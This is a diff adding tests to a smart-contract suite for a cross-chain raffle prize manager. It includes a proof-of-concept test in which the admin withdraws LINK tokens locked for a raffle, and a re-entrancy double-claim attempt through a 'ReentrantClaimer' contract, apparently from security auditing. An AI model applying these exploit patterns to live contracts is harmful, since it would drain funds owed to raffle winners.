@@ -221,6 +221,41 @@ describe('CCIP Prize Manager', () => {
     await expect(tx).to.be.revertedWithCustomError(manager, 'InvalidPrize');
   });
 
+  it('Stealing locked tokens', async () => {
+    //mint some LINK
+    await (await link.connect(winnablesDeployer).mint(manager.address, ethers.utils.parseEther('100'))).wait();
+    await (await token.connect(winnablesDeployer).mint(winnablesDeployer.address, 100)).wait();
+    //send some LINK
+    await (await link.transfer(manager.address, 100)).wait();
+
+    const linkBalance = await link.balanceOf(manager.address);
+    //lock LINK tokens for the raffle
+    const tx = await manager.connect(winnablesDeployer).lockTokens(
+      counterpartContractAddress,
+      1,
+      30,
+      link.address,
+      linkBalance
+    );
+    const { events } = await tx.wait();
+    const ccipMessageEvent = ccipRouter.interface.parseLog(events[0]);
+    expect(ccipMessageEvent.name).to.eq('MockCCIPMessageEvent');
+    await expect(manager.getNFTRaffle(30)).to.be.revertedWithCustomError(manager, 'InvalidRaffle');
+    await expect(manager.getETHRaffle(30)).to.be.revertedWithCustomError(manager, 'InvalidRaffle');
+    const tokenInfo = await manager.getTokenRaffle(30);
+    expect(tokenInfo.tokenAddress).to.eq(link.address);
+    expect(tokenInfo.amount).to.eq(linkBalance);
+    const prize = await manager.getRaffle(3);
+    expect(prize.raffleType).to.eq(3);
+    expect(prize.status).to.eq(0);
+    expect(prize.winner).to.eq(ethers.constants.AddressZero);
+
+    //steal LINK tokens blocked from the raffle
+    await manager.withdrawToken(link.address, await link.balanceOf(manager.address));
+
+    expect(await link.balanceOf(manager.address)).to.eq(0);
+  });
+
   describe('Attempts to cancel the raffle and withdraw the NFT', () => {
     before(async () => {
       snapshot = await helpers.takeSnapshot();
@@ -772,11 +807,100 @@ describe('CCIP Prize Manager', () => {
     });
 
     it('Claims twice as Winner A', async () => {
-        const tx = await manager.connect(winnerA).claimPrize(100);
+      const tx = await manager.connect(winnerA).claimPrize(100);
+      await tx.wait();
+      await expect(manager.connect(winnerA).claimPrize(100)).to.be.revertedWithCustomError(
+        manager, 'AlreadyClaimed'
+      );
+    });
+
+    it('Claim as winner B', async () => {
+      {
+        const tx = await manager.connect(winnerB).claimPrize(101);
         await tx.wait();
-        await expect(manager.connect(winnerA).claimPrize(100)).to.be.revertedWithCustomError(
-          manager, 'AlreadyClaimed'
+      }
+    });
+  });
+
+  describe('Re-entrant Double-claim prize (ETH)', () => {
+    let winnerA;
+    let winnerB;
+    before(async () => {
+      const factory = await ethers.getContractFactory('ReentrantClaimer');
+      winnerA = await factory.deploy();
+      winnerB = await getWalletWithEthers();
+      snapshot = await helpers.takeSnapshot();
+    });
+    after(async () => {
+      await snapshot.restore();
+    });
+
+    it('Create 2 ETH raffles', async () => {
+      const value = 1;
+      await (await manager.setCCIPCounterpart(counterpartContractAddress, 1, true)).wait();
+      {
+        const tx = await manager.connect(winnablesDeployer).lockETH(
+          counterpartContractAddress,
+          1,
+          100,
+          value,
+          {
+            value
+          }
         );
+        await tx.wait();
+      }
+      {
+        const tx = await manager.connect(winnablesDeployer).lockETH(
+          counterpartContractAddress,
+          1,
+          101,
+          value,
+          {
+            value
+          }
+        );
+        await tx.wait();
+      }
+    });
+    it('Declare 2 different winners for each', async () => {
+      {
+        const tx = await whileImpersonating(ccipRouter.address, ethers.provider, async (signer) =>
+          manager.connect(signer).ccipReceive({
+            messageId: ethers.constants.HashZero,
+            sourceChainSelector: 1,
+            sender: '0x' + counterpartContractAddress.slice(-40).padStart(64, '0'),
+            data: '0x' +
+              '01' +
+              '0000000000000000000000000000000000000000000000000000000000000064' +
+              winnerA.address.slice(-40).toLowerCase(),
+            destTokenAmounts: []
+          })
+        );
+        await tx.wait();
+      }
+      {
+        const tx = await whileImpersonating(ccipRouter.address, ethers.provider, async (signer) =>
+          manager.connect(signer).ccipReceive({
+            messageId: ethers.constants.HashZero,
+            sourceChainSelector: 1,
+            sender: '0x' + counterpartContractAddress.slice(-40).padStart(64, '0'),
+            data: '0x' +
+              '01' +
+              '0000000000000000000000000000000000000000000000000000000000000065' +
+              winnerB.address.slice(-40).toLowerCase(),
+            destTokenAmounts: []
+          })
+        );
+        await tx.wait();
+      }
+    });
+
+    it('Cannot re-enter and double-claim as Winner A', async () => {
+      await expect(winnerA.doubleClaim(manager.address, 100)).to.be.revertedWithCustomError(
+        manager,
+        'AlreadyClaimed',
+      );
     });
 
     it('Claim as winner B', async () => {
